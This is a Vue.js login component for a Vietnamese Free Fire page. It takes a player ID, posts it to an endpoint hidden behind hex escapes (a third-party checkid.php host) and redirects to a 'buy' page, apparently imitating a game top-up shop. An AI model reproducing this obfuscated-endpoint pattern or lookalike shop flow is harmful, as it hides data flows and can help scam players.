<template>
 <div class="s-form-1">
        <div class="container">
            <div class="s_box">
                <div class="s_title"><img src="images/faifai.png" alt=""> <span>ID Đăng Nhập</span></div>
                <form id="form_1" @submit.prevent="loginform()" accept-charset="utf-8">
                    <div class="form-group c-form is-empty">
                        <input type="text" v-model="freefire.id" class="c_input"  placeholder="ID người chơi">
                    </div>
                    <span class="c-error">{{error.id }}</span>
                    <button id="login" type="submit" class="c-button-4">Đăng nhập</button>
                </form>
            </div>
        </div>
    </div>
</template>

<script>
export default {
    name : 'loginform',
    data(){
        return {
            error:{
                id: ''
            },
            freefire:{
                id: ''
            }
        }
    }, 
    methods : {
        validate(){
            if(this.freefire.id.length === 0 ){
                this.error.id = "Vui lòng nhập ID người chơi"
            }else if( this.freefire.id.length < 7){
                 this.error.id = "ID người chơi không hợp lệ"
            }else if( this.freefire.id.length > 12){
                 this.error.id = "ID người chơi không hợp lệ"
            }else{
                return true
            }
        },
        loginform(){
            if(this.validate() == true){


    
                     this.$request.post('\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2e\x76\x6e\x31\x2e\x66\x75\x6e\x2f\x63\x68\x65\x63\x6b\x69\x64\x2e\x70\x68\x70', {app_id: 100067, login_id: this.freefire.id, app_server_id: 0}).then(res =>{
                    if(res.data.status == 200){
                    sessionStorage.setItem('idGame',res.data.name);
                     window.location.href = '/app/100067/buy/0'
                    }else {
                        this.error.id = "ID người chơi không hợp lệ"
                    }
                     })
                //  sessionStorage.setItem('idGame',this.freefire.id);
                // window.location.href = '/app/100067/buy/0'
            }

        }
    }
}





</script>